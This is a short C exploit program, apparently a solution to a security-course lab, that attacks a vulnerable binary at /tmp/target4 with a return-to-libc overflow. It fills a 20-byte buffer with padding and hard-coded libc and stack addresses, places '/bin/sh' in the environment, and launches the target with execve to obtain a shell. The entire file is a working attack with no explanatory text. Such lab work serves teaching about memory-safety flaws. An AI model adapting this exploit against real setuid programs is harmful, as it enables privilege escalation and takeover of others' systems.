#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	char *args[3]; 
	char *env[1];

	int shellLen = strlen(shellcodeAlephOne);
	int A1 = 203;
	unsigned char esp[4];

	int strSize = 20;
	char strPtr[20];

	for(int i = 0; i < 20;i++) {
		strPtr[i] = 0x41;
	}

	int startSys = sizeof(strPtr) - 12;
	int startBTW = startSys + 4;
	int startSHI = startBTW + 4;

	strPtr[startSys+3] = 0xb7;strPtr[startSys+2]=0xe4;strPtr[startSys+1]=0x3d;strPtr[startSys]=0xa0;
	strPtr[startBTW+3] = 0xb7;strPtr[startBTW+2]=0xe3;strPtr[startBTW+1]=0x79;strPtr[startBTW]=0xd0;
	//strPtr[startSHI+3] = 0xbf;strPtr[startSHI+2]=0xff;strPtr[startSHI+1]=0xfe;strPtr[startSHI]=0x4c; 
	strPtr[startSHI+3] = 0xbf;strPtr[startSHI+2]=0xff;strPtr[startSHI+1]=0xff;strPtr[startSHI]=0xc5; 
	
	env[0]  = "/bin/sh";
	//env[0] = NULL;
	args[0] = TARGET;
	args[1] = strPtr; 
	args[2] = NULL;

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}


